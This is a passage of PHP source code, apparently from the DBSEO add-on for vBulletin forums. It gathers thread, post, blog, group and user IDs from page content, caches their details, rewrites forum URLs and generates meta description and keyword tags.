				self::$cache['_objectIds'][self::$config['_picturestorage']] = array_merge(self::$cache['_objectIds'][self::$config['_picturestorage']], $matches[1]);
			}

			if (preg_match_all('#group\.php\?[^"\']*?discussionid=(\d+)#', $_content, $matches))
			{
				// Discussion url
				self::$cache['_objectIds']['groupsdis'] = is_array(self::$cache['_objectIds']['groupsdis']) ? self::$cache['_objectIds']['groupsdis'] : array();
				self::$cache['_objectIds']['groupsdis'] = array_merge(self::$cache['_objectIds']['groupsdis'], $matches[1]);
			}

			if (preg_match_all('#group\.php\?[^"]*?groupid=(\d+)#', $_content, $matches))
			{
				// Group url
				self::$cache['_objectIds']['groups'] = $matches[1];
			}

			if (preg_match_all('#picture\.php\?[^"]*?groupid?=(\d+)#', $_content, $matches))
			{
				// Picture url
				self::$cache['_objectIds']['groups'] = is_array(self::$cache['_objectIds']['groups']) ? self::$cache['_objectIds']['groups'] : array();
				self::$cache['_objectIds']['groups'] = array_merge(self::$cache['_objectIds']['groups'], $matches[1]);
			}
		}

		if (self::$config['dbtech_dbseo_rewrite_attachment'] AND preg_match_all('#(?:attachment|group)\.php\?[^"]*?attachmentid=(\d+)#', $_content, $matches))
		{
			// Attachment url
			self::$cache['_objectIds']['attach'] = is_array(self::$cache['_objectIds']['attach']) ? self::$cache['_objectIds']['attach'] : array();
			self::$cache['_objectIds']['attach'] = array_merge(self::$cache['_objectIds']['attach'], $matches[1]);
		}

		if (self::$config['dbtech_dbseo_rewrite_thread'])
		{
			if (intval($vbulletin->versionnumber) == 4)
			{
				$showpostMatches = preg_match_all('#' . $_prefix . 'showthread\.php\?[^"]*?p(?:ostid|ost)?=(\d+)#', $_content, $matches);
			}
			else
			{
				$showpostMatches = preg_match_all('#' . $_prefix . 'showpost\.php\?[^"]*?p(?:ostid|ost)?=(\d+)#', $_content, $matches);
			}

			if ($showpostMatches)
			{
				// Thread url
				self::$cache['_objectIds']['postthread_ids'] = $matches[1];

				if (THIS_SCRIPT == 'showpost' AND !$_GET['postcount'])
				{
					// Also include showpost
					self::$cache['_objectIds']['prepostthread_ids'] = $matches[1];
				}
			}
		}

		if (self::$config['dbtech_dbseo_rewrite_poll'] AND preg_match_all('#poll\.php\?[^"]*?do=showresults&.*?pollid=(\d+)#', $_content, $matches))
		{
			// Poll url
			self::$cache['_objectIds']['poll_ids'] = $matches[1];
		}

		if (self::$config['dbtech_dbseo_rewrite_thread'] AND preg_match_all('#' . $_prefix . '(?:show|print)thread\.php\?[^"]*?t(?:hreadid)?=(\d+)#', $_content, $matches))
		{
			// Thread url
			self::$cache['_objectIds']['thread_ids'] = is_array(self::$cache['_objectIds']['thread_ids']) ? self::$cache['_objectIds']['thread_ids'] : array();
			self::$cache['_objectIds']['thread_ids'] = array_merge(self::$cache['_objectIds']['thread_ids'], $matches[1]);
		}

		if (self::$config['dbtech_dbseo_rewrite_avatar'] AND preg_match_all('#image\.php\?[^"]*?u=(\d+)#', $_content, $matches))
		{
			// Avatar url
			self::$cache['_objectIds']['user_ids'] = is_array(self::$cache['_objectIds']['user_ids']) ? self::$cache['_objectIds']['user_ids'] : array();
			self::$cache['_objectIds']['user_ids'] = array_merge(self::$cache['_objectIds']['user_ids'], $matches[1]);
		}

		if (self::$config['dbtech_dbseo_rewrite_cms'] AND intval(self::$config['templateversion']) == 4)
		{
			if (preg_match_all('#content\.php\?[^"]*?' . self::$config['route_requestvar'] . '=(\d+)#', $_content, $matches))
			{
				// Content url
				self::$cache['_objectIds']['cmscont'] = is_array(self::$cache['_objectIds']['cmscont']) ? self::$cache['_objectIds']['cmscont'] : array();
				self::$cache['_objectIds']['cmscont'] = array_merge(self::$cache['_objectIds']['cmscont'], $matches[1]);
			}

			if (preg_match_all('#list\.php\?[^"]*?' . self::$config['route_requestvar'] . '=category/(\d+)#', $_content, $matches))
			{
				// Cms category url
				self::$cache['_objectIds']['cms_cat'] = is_array(self::$cache['_objectIds']['cms_cat']) ? self::$cache['_objectIds']['cms_cat'] : array();
				self::$cache['_objectIds']['cms_cat'] = array_merge(self::$cache['_objectIds']['cms_cat'], $matches[1]);
			}
		}

		if (isset(self::$cache['_objectIds']['found_thread_ids']) AND is_array(self::$cache['_objectIds']['found_thread_ids']))
		{
			// Merge our found thread IDs
			self::$cache['_objectIds']['thread_ids'] = is_array(self::$cache['_objectIds']['thread_ids']) ? self::$cache['_objectIds']['thread_ids'] : array();
			self::$cache['_objectIds']['thread_ids'] = array_merge(self::$cache['_objectIds']['thread_ids'], self::$cache['_objectIds']['found_thread_ids']);
		}

		// Reset thread cache
		self::$cache['thread'] = array();

		if (
			isset(self::$cache['_objectIds']['announcements']) AND
			count(self::$cache['_objectIds']['announcements'])
		)
		{
			// Grab announcements from cache
			DBSEO_Rewrite_Announcement::getInfo(self::$cache['_objectIds']['announcements']);
		}

		if (
			isset(self::$cache['_objectIds']['poll_ids']) AND
			count(self::$cache['_objectIds']['poll_ids'])
		)
		{
			// Grab poll stuff
			DBSEO_Rewrite_Poll::getInfo(self::$cache['_objectIds']['poll_ids']);
		}

		if (
			self::$config['dbtech_dbseo_rewrite_attachment'] AND
			isset(self::$cache['_objectIds']['attach']) AND
			count(self::$cache['_objectIds']['attach'])
		)
		{
			// Grab attachment cache
			DBSEO_Rewrite_Attachment::getInfo(self::$cache['_objectIds']['attach']);

			foreach (self::$cache['attachment'] as $attachment)
			{
				if ($attachment['contentid'] AND self::getContentType($attachment) == 'forum')
				{
					// Store post/thread ID
					self::$cache['_objectIds']['postthread_ids'][] = $attachment['contentid'];
				}
			}
		}

		if (
			is_array(self::$cache['_objectIds']['thread_ids']) OR
			is_array(self::$cache['_objectIds']['postthreads'])
		)
		{
			self::$cache['_objectIds']['thread_ids'] = is_array(self::$cache['_objectIds']['thread_ids']) ? self::$cache['_objectIds']['thread_ids'] : array();
			self::$cache['_objectIds']['postthreads'] = is_array(self::$cache['_objectIds']['postthreads']) ? self::$cache['_objectIds']['postthreads'] : array();

			// Merge all thread ID arrays
			self::$cache['_objectIds']['thread_ids'] = array_merge(
				self::$cache['_objectIds']['thread_ids'],
				self::$cache['_objectIds']['postthreads']
			);

			if (self::$cache['thread_pre'])
			{
				// Reset thread cache
				self::$cache['thread'] = array();

				$threadIds = array();
				foreach (self::$cache['thread_pre'] as $threadId => $thread)
				{
					// Shorthand
					$threadId = $thread['threadid'] ? $thread['threadid'] : $threadId;

					// Cache the thread info
					self::$cache['thread'][$threadId] = $thread;

					if (
						self::$cache['_objectIds']['thread_last'] AND
						in_array($thread['threadid'], self::$cache['_objectIds']['thread_last'])
					)
					{
						// Store lastposter in username cache
						self::$cache['_objectIds']['user_names'][] = $thread['lastposter'];
					}

					if (
						!self::$config['dbtech_dbseo_rewrite_thread_prefix'] OR
						self::$cache['thread'][$threadId]['prefixid']
					)
					{
						// We need to exclude this from further caching
						$threadIds[] = $threadId;
					}
				}

				// Remove this threadid from the cache
				self::$cache['_objectIds']['thread_ids'] = array_diff(self::$cache['_objectIds']['thread_ids'], $threadIds);

				foreach (self::$cache['thread'] as $threadId => $thread)
				{
					// Store userinfo cache
					self::$cache['_objectIds']['userinfo'][$thread['postuserid']] = array(
						'userid' 	=> $thread['postuserid'],
						'username' 	=> $thread['postusername']
					);

					if ($thread['pollid'])
					{
						// Set poll cache
						self::$cache['poll'][$thread['pollid']]['threadid'] = $threadId;
					}
				}
			}

			if (isset($GLOBALS['getlastpost']))
			{
				// Set lastpost info
				self::$cache['thread'][$GLOBALS['getlastpost']['threadid']] = $GLOBALS['getlastpost'];
			}

			if (count(self::$cache['_objectIds']['thread_ids']))
			{
				// Cache thread info
				DBSEO_Rewrite_Thread::getInfo(self::$cache['_objectIds']['thread_ids']);
			}
		}

		if (self::$cache['_objectIds']['postthread_ids'])
		{
			// Cache thread and post info
			self::getThreadPostInfo(self::$cache['_objectIds']['postthread_ids'], true);
		}

		if (self::$cache['_objectIds']['prepostthread_ids'])
		{
			// Cache thread and post info
			self::getThreadPostInfo(self::$cache['_objectIds']['prepostthread_ids'], true);
		}

		if (self::$config['dbtech_dbseo_rewrite_socialgroup'])
		{
			// Ensure this is an array
			self::$cache['_objectIds']['groups'] 	= is_array(self::$cache['_objectIds']['groups']) 	? self::$cache['_objectIds']['groups'] 	: array();
			self::$cache['socialgroup'] 			= is_array(self::$cache['socialgroup']) 			? self::$cache['socialgroup'] 			: array();

			if (is_array($GLOBALS['group']) AND $GLOBALS['group']['groupid'])
			{
				// Store the global social group information if available
				self::$cache['socialgroup'][$GLOBALS['group']['groupid']] = $GLOBALS['group'];
			}

			// Get social group discussion info
			self::getObjectInfo('groupsdis', self::$cache['_objectIds']['groupsdis']);

			foreach ((array)self::$cache['socialgroupdiscussion'] as $socialGroupDiscussion)
			{
				// Store social group ID
				self::$cache['_objectIds']['groups'][] = $socialGroupDiscussion['groupid'];
			}

			// Remove any already cached groups
			self::$cache['_objectIds']['groups'] = array_diff(self::$cache['_objectIds']['groups'], array_keys(self::$cache['socialgroup']));

			// Get social group info
			DBSEO_Rewrite_SocialGroup::getInfo(self::$cache['_objectIds']['groups']);

			foreach (self::$cache['socialgroup'] as $socialGroup)
			{
				// Cache social group category ID
				self::$cache['socialgroupcategory'][$socialGroup['socialgroupcategoryid']] = array(
					'categoryid' 	=> $socialGroup['socialgroupcategoryid'],
					'title' 		=> $socialGroup['categoryname'],
				);
			}

			if ($GLOBALS['discussion'])
			{
				// Cache social group discussion info
				self::$cache['socialgroupdiscussion'][$GLOBALS['discussion']['discussionid']] = $GLOBALS['discussion'];
			}

			if (isset($vbulletin) AND isset($vbulletin->sg_category_cloud))
			{
				foreach ($vbulletin->sg_category_cloud as $socialGroupCategory)
				{
					// Cache social group category info
					self::$cache['socialgroupcategory'][$socialGroupCategory['categoryid']] = $socialGroupCategory;
				}
			}
		}

		if (self::$config['dbtech_dbseo_rewrite_blog'])
		{
			// Ensure this is an array
			self::$cache['_objectIds']['blogcat_ids'] 	= is_array(self::$cache['_objectIds']['blogcat_ids']) 	? self::$cache['_objectIds']['blogcat_ids'] 	: array();
			self::$cache['battach'] 					= is_array(self::$cache['battach']) 					? self::$cache['battach'] 						: array();
			self::$cache['blogcategory'] 				= is_array(self::$cache['blogcategory']) 				? self::$cache['blogcategory'] 					: array();

			foreach ((array)$GLOBALS['postattach'] as $attachment)
			{
				if (!is_array($attachment))
				{
					// Not an array, skip this
					continue;
				}

				if ($attachmentId = $attachment['attachmentid'])
				{
					// Overwrite attachment array
					$attachment = array($attachmentId => $attachment);
				}

				foreach ($attachment as $attachmentId => $att)
				{
					// Set blog attachment cache
					self::$cache['battach'][$attachmentId] = $att;
				}
			}

			if (self::$cache['_objectIds']['blogatt_ids'])
			{
				// Get blog attachment cache
				DBSEO_Rewrite_BlogAttachment::getInfo(self::$cache['_objectIds']['blogatt_ids']);
			}

			foreach (self::$cache['battach'] as $blogAttachment)
			{
				// Store blog IDs to cache
				self::$cache['_objectIds']['blog_ids'][] = $blogAttachment['blogid'];
			}

			if (is_array($GLOBALS['blog']) AND $GLOBALS['blog']['blogid'] AND $GLOBALS['blog']['userid'])
			{
				// We have blog info in the global scope
				self::$cache['blog'][$GLOBALS['blog']['blogid']] = $GLOBALS['blog'];
			}

			if (self::$cache['_objectIds']['blog_ids'])
			{
				// Get blog info
				DBSEO_Rewrite_Blog::getInfo(self::$cache['_objectIds']['blog_ids']);
			}

			if (isset($vbulletin->vbblog['categorycache']))
			{
				foreach ($vbulletin->vbblog['categorycache'] as $categories)
				{
					if (!is_array($categories))
					{
						// Error prevention
						continue;
					}

					foreach ($categories as $categoryId => $category)
					{
						// Set blog category cache
						self::$cache['blogcategory'][$categoryId] = $category;
					}
				}
			}

			$blogCategories = (array)($GLOBALS['vblog_categories'] ? $GLOBALS['vblog_categories'] : $GLOBALS['categories']);
			foreach ($blogCategories as $categories)
			{
				if (!is_array($categories))
				{
					// Error prevention
					continue;
				}

				foreach ($categories as $categoryId => $category)
				{
					if (!isset($category['blogcategoryid']))
					{
						// Error prevention
						continue;
					}

					// Set blog category cache
					self::$cache['blogcategory'][$category['blogcategoryid']] = $category;
				}
			}

			// Ensure we don't attempt to re-cache
			self::$cache['_objectIds']['blogcat_ids'] = array_diff(self::$cache['_objectIds']['blogcat_ids'], array_keys(self::$cache['blogcategory']));

			if (self::$cache['_objectIds']['blogcat_ids'])
			{
				// Get blog category cache
				DBSEO_Rewrite_BlogCategory::getInfo(self::$cache['_objectIds']['blogcat_ids']);
			}

			if (isset(self::$cache['blog']) AND is_array(self::$cache['blog']))
			{
				foreach (self::$cache['blog'] as $blog)
				{
					// Extract user IDs from blog
					self::$cache['_objectIds']['user_ids'][] = $blog['userid'];
				}
			}

			// Grab custom blog blocks
			self::getObjectInfo('blogcustomblock', self::$cache['_objectIds']['blogcustomblock']);
		}

		if (!(intval(self::$config['templateversion']) == 4) AND is_array($GLOBALS['pictureinfo']))
		{
			self::$cache[self::$config['_picturestorage']][$GLOBALS['pictureinfo'][self::$config['_pictureid']]] = $GLOBALS['pictureinfo'];
		}

		// Get user picture storage info
		self::getObjectInfo(self::$config['_picturestorage'], self::$cache['_objectIds'][self::$config['_picturestorage']]);

		if (self::$config['dbtech_dbseo_rewrite_cms'] AND intval(self::$config['templateversion']) == 4)
		{
			// We need to grab CMS content cache
			self::getObjectInfo('cmscont', self::$cache['_objectIds']['cmscont']);

			// We need to grab CMS Category cache
			self::getObjectInfo('cms_cat', self::$cache['_objectIds']['cms_cat']);
		}

		if (
			(
				self::$config['dbtech_dbseo_rewrite_memberprofile'] OR
				self::$config['dbtech_dbseo_rewrite_album'] OR
				self::$config['dbtech_dbseo_rewrite_avatar'] OR
				self::$config['dbtech_dbseo_rewrite_blog']
			) AND
			(
				!empty(self::$cache['_objectIds']['user_ids']) OR
				!empty(self::$cache['_objectIds']['user_names'])
			)
		)
		{
			// Ensure this is an array
			self::$cache['_objectIds']['user_names'] 	= is_array(self::$cache['_objectIds']['user_names']) 	? self::$cache['_objectIds']['user_names'] 	: array();
			self::$cache['_objectIds']['user_ids'] 		= is_array(self::$cache['_objectIds']['user_ids']) 		? self::$cache['_objectIds']['user_ids'] 	: array();
			self::$cache['username'] 					= is_array(self::$cache['username']) 					? self::$cache['username'] 					: array();

			foreach ((array)self::$cache[self::$config['_picturestorage']] as $picture)
			{
				if (self::getContentType($picture) == 'album')
				{
					// Grab content info from attach info
					self::$cache['_objectIds']['album'][] = self::getContentId($picture);
				}
			}

			if (is_array($GLOBALS['albuminfo']))
			{
				// Store album cache from album info
				self::$cache['album'][$GLOBALS['albuminfo']['albumid']] = $GLOBALS['albuminfo'];
			}

			// Get album info to cache
			self::getObjectInfo('album');

			foreach ((array)self::$cache['album'] as $picture)
			{
				// Get additional users to cache
				self::$cache['_objectIds']['user_ids'][] = $picture['userid'];
			}

			// Ensure we only have unique user ids
			$userids = array_unique(self::$cache['_objectIds']['user_ids']);

			if (isset($GLOBALS['newuserid']))
			{
				// Pre-cache user info
				self::$cache['_objectIds']['userinfo'][$GLOBALS['newuserid']] = array(
					'userid' 	=> $GLOBALS['newuserid'],
					'username' 	=> $GLOBALS['newusername']
				);
			}

			foreach ((array)self::$cache['_objectIds']['userinfo'] as $userId => $userInfo)
			{
				if ($userId AND $userName = strip_tags($userInfo['username']))
				{
					// Pre-cache user info
					self::$cache['user'][$userId] = self::$cache['username'][strtolower($userName)] = array(
						'userid' 	=> $userId,
						'username' 	=> $userName
					);
				}
			}

			foreach ((array)self::$cache['post'] as $postId => $post)
			{
				if (isset($post['postuserid']) AND $userId = $post['postuserid'] AND $userName = $post['postusername'])
				{
					// Pre-cache user info
					self::$cache['user'][$userId] = self::$cache['username'][strtolower($userName)] = array(
						'userid' 	=> $userId,
						'username' 	=> $userName
					);
				}
			}

			// Ensure we only cache users we haven't cached before
			$userids = array_diff($userids, array_keys(self::$cache['user'] ? self::$cache['user'] : array()));

			// Ensure we only cache users we haven't cached before
			self::$cache['_objectIds']['user_names'] = array_diff(self::$cache['_objectIds']['user_names'], array_keys(self::$cache['username']));

			if (!empty($userids) OR !empty(self::$cache['_objectIds']['user_names']))
			{
				// Cache the user info
				self::getUserInfo($userids, self::$cache['_objectIds']['user_names']);
			}
			else
			{
				for ($i = 0; $i < count($userids); $i++)
				{
					// Just cache userids
					self::$cache['user'][$userids[$i]] = array(
						'userid' => $userids[$i]
					);
				}
			}
		}

		self::$config['_baseHref'] = false;
		if (
			DBSEO_BASEDEPTH AND
			preg_match('#<base href="([^\"]*)#i', $content, $matches) AND
			preg_replace('#/[^/]*$#', '', $matches[1]) == self::$config['_bburl']
		)
		{
			// We need to update the base href later on
			self::$config['_baseHref'] = true;
		}

		if (DBSEO_BASEDEPTH AND self::$config['_preprocessed'])
		{
			$_baseUrl = self::$config['_bburl'];
			if (
				strpos($_baseUrl, DBSEO_HTTP_HOST) === false
				/*DBTECH_PRO_START*/
				AND (
					self::$config['dbtech_dbseo_custom_cms']
					OR self::$config['dbtech_dbseo_custom_blog']
					OR self::$config['dbtech_dbseo_custom_forum']
				)
				/*DBTECH_PRO_END*/
			)
			{
				// Overwrite the base URL
				$_baseUrl = DBSEO_URL_SCHEME . '://' . DBSEO_HTTP_HOST;
			}

			// Replace the base url
			$content = preg_replace('#<head>#i', "$0\n" . '<base href="' . $_baseUrl . '/" /><!--[if IE]></base><![endif]-->', $content, 1);
		}

		if (isset(self::$cache['_objectIds']) AND count(self::$cache['_objectIds']))
		{
			if (isset(self::$config['dbtech_dbseo_rewrite_texturls']) AND self::$config['dbtech_dbseo_rewrite_texturls'])
			{
				// Replace text urls in content
				$content = preg_replace_callback(
					'#(' . str_replace('tps\:','tps?\:', preg_quote(self::$config['_bburl'], '#')) . '/?)([^<\]\[\"\)\s]*)#is',
					array('DBSEO', 'replaceTextUrls'),
					$content
				);
			}

			if (self::$config['_isXML'])
			{
				// Replace text urls in XML
				$content = preg_replace_callback(
					'#(<link>(?:\<\!\[CDATA\[)?)([^<\]]*)#is',
					array('DBSEO', 'replaceTextUrls'),
					$content
				);
			}

			// Do main content replacements
			$content2 = preg_replace_callback(
				'#(value="(?:\[.*?\])?)(' . preg_quote(self::$config['_bburl'], '#') . '/?)([^<\]\[\"\)\s]*)#is',
				array('DBSEO', 'replaceMainContent'),
				$content
			);

			// Ensure we only overwrite content if it's valid
			$content = $content2 ? $content2 : $content;

			if (!isset(self::$config['dbtech_dbseo_rewrite_texturls']) OR !self::$config['dbtech_dbseo_rewrite_texturls'])
			{
				$content = preg_replace_callback(
					'#(<(?:a|span|iframe|form|script|link|img|meta)([^>]*?)(?:href|src|action|url|\.open|\.location|content)\s*[=\(]\s*["\'])([^"\'>\)]*)(.*?[\>])([^<]*)(</a>)?#is',
					array('DBSEO', 'replaceTags'),
					$content
				);

				if (!self::$config['_inAjax'] AND isset(self::$cache['urlReplace']))
				{
					// Start fresh!
					unset(self::$cache['urlReplace']);
				}

				if (strpos($_SERVER['REQUEST_URI'], 'printthread.php') !== false)
				{
					// Ensure we're doing this
					self::$config['_rewritePrintThread'] = 1;

					// Replace the text URLs again
					$content = preg_replace_callback(
						'#(\([^\)]*?(?:http://)?[^\)]*?)(' . preg_quote(self::$config['_bburl'], '#') . '/[^<\)]*)#is',
						array('DBSEO', 'replaceTextUrls'),
						$content
					);
				}
			}
		}

		if (self::$config['dbtech_dbseo_analytics_account'] AND self::$config['dbtech_dbseo_analytics_track_external'] AND self::isThreaded())
		{
			// Ensure we track external urls
			$content = preg_replace_callback(
				'#^(\s*pd\[\d+\] = )\'(.+)$#m',
				array('DBSEO', 'replaceExternalLinks'),
				$content
			);
		}

		if (intval(self::$config['templateversion']) != 4)
		{
			// Shorthand
			$threadIconUrl = 'images/misc/navbits_finallink';

			if (self::$config['dbtech_dbseo_rewrite_navbullet'] AND strpos($content, $threadIconUrl) !== false)
			{
				if (preg_match('#' . $threadIconUrl . '(_...)?[^>]+?alt="([^"]+)"#', $content, $matches))
				{
					// Parse the thread icon url
					$currentDir = $matches[1];
					$currentAlt = $matches[2];
				}

				// Shorthand
				$threadIconFullUrl = $threadIconUrl . $currentDir . '.gif';

				if ($GLOBALS['tempusagecache']['FORUMDISPLAY'])
				{
					if (preg_match('#f=(\d+)#', $_SERVER['REQUEST_URI'], $matches))
					{
						// Grab our forum cache
						$forumcache = self::$db->fetchForumCache();

						$content = str_replace(
							$threadIconFullUrl,
							DBSEO_Url_Create::create('NavBullet_NavBullet_Forum', array(
								'currentDir' 	=> $currentDir,
								'forumid' 		=> $matches[1]
							)),
							$content
						);
						$content = str_replace($currentAlt, str_replace('"', '&quot;', $forumcache[$matches[1]]['title']), $content);
					}
				}
				else if ($GLOBALS['tempusagecache']['SHOWTHREAD'])
				{
					// Ensure we top load this
					reset(self::$cache['thread']);

					// Extract this information
					list($threadid, $threadInfo) = each(self::$cache['thread']);

					$content = str_replace(
						array(
							$threadIconFullUrl,
							$currentAlt
						),
						array(
							DBSEO_Url_Create::create('NavBullet_NavBullet_Thread', array(
								'currentDir' 	=> $currentDir,
								'threadid' 		=> $threadid,
								'forumid' 		=> $threadInfo['forumid'],
							)),
							str_replace('"', '&quot;', $threadInfo['title'])
						),
						$content
					);
				}
			}
		}

		// Init some important things
		$_keyWords = $_description = '';
		$_appendDescription = $_overwriteKeywords = false;

		switch (THIS_SCRIPT)
		{
			case 'showpost':
				if (self::$config['dbtech_dbseo_metadescription_posts'] AND $GLOBALS['postinfo']['postid'])
				{
					// Append rather than overwrite
					$_appendDescription = true;

					// Set post info
					$_description = 'Post ' . $GLOBALS['postinfo']['postid'] . ' - ';
				}
				break;

			case 'tags':
			case 'tag':
				if (self::$config['dbtech_dbseo_metadescription_tags'] AND self::$config['dbtech_dbseo_metadescription_tags_' . $_REQUEST['do'] . '_content'])
				{
					// Description from tags
					//global $vbphrase;
					//$_description = construct_phrase($vbphrase['threads_tagged_with_x'], $GLOBALS['tag']['tagtext']);

					// Description replacements
					$_description = trim(str_replace(
						array('[tag]', '[page]', '[bb_title]', '[bbtitle]'),
						array($GLOBALS['vbulletin']->GPC['tag'], ($GLOBALS['vbulletin']->GPC['pagenumber'] ? $GLOBALS['vbulletin']->GPC['pagenumber'] : 1), self::$config['bbtitle'], self::$config['bbtitle']),
						stripslashes(self::$config['dbtech_dbseo_metadescription_tags_' . $_REQUEST['do'] . '_content'])
					));
				}

				/*
				if (self::$config['dbtech_dbseo_metakeyword_tags'] AND self::$config['dbtech_dbseo_metakeyword_tags_' . $_REQUEST['do'] . '_content'])
				{
					// Blog keywords from title
					$_keyWords = trim(str_replace(
						array('[tag]', '[page]', '[bb_title]', '[bbtitle]'),
						array($GLOBALS['vbulletin']->GPC['tag'], $GLOBALS['vbulletin']->GPC['pagenumber'], self::$config['bbtitle'], self::$config['bbtitle']),
						stripslashes(self::$config['dbtech_dbseo_metakeyword_tags_' . $_REQUEST['do'] . '_content'])
					));
				}
				*/
				// Hardcode this to be added for now
				$_keyWords = $GLOBALS['vbulletin']->GPC['tag'];
				break;

			case 'member':
				if (self::$config['dbtech_dbseo_metadescription_memberprofiles'])
				{
					global $userinfo, $vbulletin;

					// Shorthand
					$usergroup = $vbulletin->usergroupcache[$userinfo['displaygroupid'] ? $userinfo['displaygroupid'] : $userinfo['usergroupid']];

					// Do description replacements
					$_description = preg_replace_callback(
						'#\[user_field_(\d+)\]#i',
						array('DBSEO', 'replaceProfileMeta'),
						str_replace(
							array('[username]', '[usertitle]', '[bb_title]', '[bbtitle]'),
							array($userinfo['username'], ($usergroup['usertitle'] ? $usergroup['usertitle'] : $usergroup['title']), self::$config['bbtitle'], self::$config['bbtitle']),
							stripslashes(self::$config['dbtech_dbseo_metadescription_memberprofiles_content'])
						)
					);
				}

				if (self::$config['dbtech_dbseo_metakeyword_memberprofiles'])
				{
					// Set the keywords to the username
					$_keyWords = self::$cache['userinfo'][intval($_GET['u'])]['username'];
				}
				break;

			case 'forumdisplay':
				if (self::$config['dbtech_dbseo_metadescription_forums'] OR self::$config['dbtech_dbseo_metakeyword_forums'])
				{
					// We need to do a few common things for this
					global $vbphrase;

					// Shorthand
					$forumcache = self::$db->fetchForumCache();
					$forumInfo = $forumcache[$_GET['f']];
				}

				if (self::$config['dbtech_dbseo_metadescription_forums'])
				{
					// Forum description
					$_description = unhtmlspecialchars($forumInfo['title']) . ($_GET['page'] > 1 ? ', ' . construct_phrase($vbphrase['page_x'], intval($_GET['page'])) : '') . (isset($forumInfo['description']) ? ' - ' . unhtmlspecialchars($forumInfo['description']) : '');

					/*DBTECH_PRO_START*/
					if ($forumInfo['dbtech_dbseo_description'])
					{
						$_description = $forumInfo['dbtech_dbseo_description'] . ($_GET['page'] > 1 ? ', ' . construct_phrase($vbphrase['page_x'], intval($_GET['page'])) : '');
					}
					/*DBTECH_PRO_END*/
				}

				if (self::$config['dbtech_dbseo_metakeyword_forums'])
				{
					// Forum keywords
					$_keyWords = preg_replace('#[^a-zA-Z0-9_\x80-\xff]+#', ',', unhtmlspecialchars($forumInfo['title']));

					/*DBTECH_PRO_START*/
					if ($forumInfo['dbtech_dbseo_keywords'])
					{
						$_keyWords = $forumInfo['dbtech_dbseo_keywords'];
						$_overwriteKeywords = true;
					}
					/*DBTECH_PRO_END*/
				}
				break;

			case 'showthread':
				if (self::$config['dbtech_dbseo_metadescription_threads'])
				{
					if (isset($GLOBALS['threadinfo']['meta_description']) AND ($GLOBALS['threadinfo']['page'] <= 1 OR !$GLOBALS['postbits']))
					{
						$_description = $GLOBALS['threadinfo']['meta_description'];
					}
					else if ($GLOBALS['postbits'])
					{
						preg_match('#<!--\s*message\s*-->(.*?)<!--\s*/\s*message\s*-->#s', $GLOBALS['postbits'], $matches);
						if (!$matches)
						{
							$_searchVal = intval(self::$config['templateversion']) == 4 ? '</blockquote>' : '</div>';
							if (strpos($GLOBALS['postbits'], $_searchVal) !== false)
							{
								// Try another match
								preg_match('#post_message_[^>]*?\>(.*?)' . $_searchVal . '#s', $GLOBALS['postbits'], $matches);
							}
						}

						// Extract the description
						$_description = trim(preg_replace(array(
							'#<!--.*?-->#s',
							'#<div>Originally Posted by.*?</div>#',
							'#<script.*?\>.*?</script>#is',
							'#(<.*?\>)+#s'
						), '', str_replace('>' . $vbphrase['quote'] . ':<', '', $matches[1])));
					}
				}
//
//				if (self::$config['dbtech_dbseo_metakeyword_threads'] AND $GLOBALS['threadinfo']['title'])
//				{
//					if (isset($GLOBALS['threadinfo']['keywords']) AND $GLOBALS['threadinfo']['keywords'])
//					{
//						// vB4 kindly sets this for us, how very kind indeed
//						$_keyWords = $GLOBALS['threadinfo']['keywords'];
//						$_overwriteKeywords = true;
//					}
//					else
//					{
//						// Do keyword replacements, would you kindly
//						preg_match_all('#([a-zA-Z0-9_\x80-\xff]+)#s', $GLOBALS['threadinfo']['title'], $matches);
//						$_keyWords = implode(',', $matches[1]);
//					}
//
//					// Also build keywords from the post
//					if ($postKeyWords = implode(',', DBSEO_Filter::contentFilter($GLOBALS['threadinfo']['description'], self::$config['dbtech_dbseo_metakeyword_length'], false)))
//					{
//						// Set this
//						$_keyWords .= ',' . $postKeyWords;
//					}
//				}
				break;

			case 'blog':
			case 'entry':
				if (self::$config['dbtech_dbseo_metadescription_blogs'] AND $GLOBALS['blog']['message'])
				{
					// Description replacements
					$_description = trim(preg_replace('#(<.*?>)+#s', ' ', $GLOBALS['blog']['message']));
				}

				if (self::$config['dbtech_dbseo_metakeyword_blogs'] AND $GLOBALS['blog']['title'])
				{
					// Blog keywords from title
					preg_match_all('#([a-zA-Z0-9_\x80-\xff]+)#s', $GLOBALS['blog']['title'], $matches);
					$_keyWords = implode(',', $matches[1]);
				}
				break;
		}

		($hook = vBulletinHook::fetch_hook('dbtech_dbseo_process_content_meta')) ? eval($hook) : false;

		if ($_keyWords)
		{
			if (!$_overwriteKeywords)
			{
				// Get rid of any HTML in the keywords
				$_keyWords = strip_tags($_keyWords);

				if (self::$config['dbtech_dbseo_stopwordlist'])
				{
					// Get rid of stopwords
					$_keyWords = preg_replace('#,?\b(' . self::$config['dbtech_dbseo_stopwordlist'] . ')\b#i', '', $_keyWords);
				}
			}

			// Ensure things are quoted properly
			$_keyWords = str_replace(array('$','\\','"'), array('\$','\\\\','&quot;'), $_keyWords);

			// Make this into array
			$_keyWords = preg_split('#\s*,\s*#s', $_keyWords, -1, PREG_SPLIT_NO_EMPTY);

			if (!$_overwriteKeywords)
			{
				if (($keywordsByPriority = self::$datastore->fetch('keywords')) === false)
				{
					$keywordsByPriority = array();

					$keywords = self::$db->generalQuery('
						SELECT *
						FROM $dbtech_dbseo_keyword
					', false);

					foreach ($keywords as $keyword)
					{
						if (!$keyword['active'])
						{
							// Inactive keyword
							continue;
						}

						// Index
						$keywordsByPriority[$keyword['priority']][] = strtolower($keyword['keyword']);
					}
				}

				// Sort by higher priority first
				krsort($keywordsByPriority);

				$keyWords = array();
				foreach ($keywordsByPriority as $priority => $keywords)
				{
					foreach ($keywords as $keyword)
					{
						if (count($keyWords) >= self::$config['dbtech_dbseo_metakeyword_length'])
						{
							// Stahp.
							break 2;
						}

						$key = array_search($keyword, $_keyWords);
						if ($key !== false)
						{
							// We got dis.
							$keyWords[] = $keyword;

							// We don't need this anymore
							unset($_keyWords[$key]);
						}
					}
				}

				// Now create this array
				$_keyWords = array_merge($keyWords, $_keyWords);

				while (count($_keyWords) > self::$config['dbtech_dbseo_metakeyword_length'])
				{
					// Get rid of more keywords
					array_pop($_keyWords);
				}
			}

			// Now finally replace the content
			$content = preg_replace('#(<meta name="keywords".*?content=)"' . (!$_overwriteKeywords ? '' : '[^"]*') . '#is', '$1"' . implode(',', $_keyWords) . (!$_overwriteKeywords ? ',' : ''), $content);
		}

		if ($_description)
		{
			// We had a description!
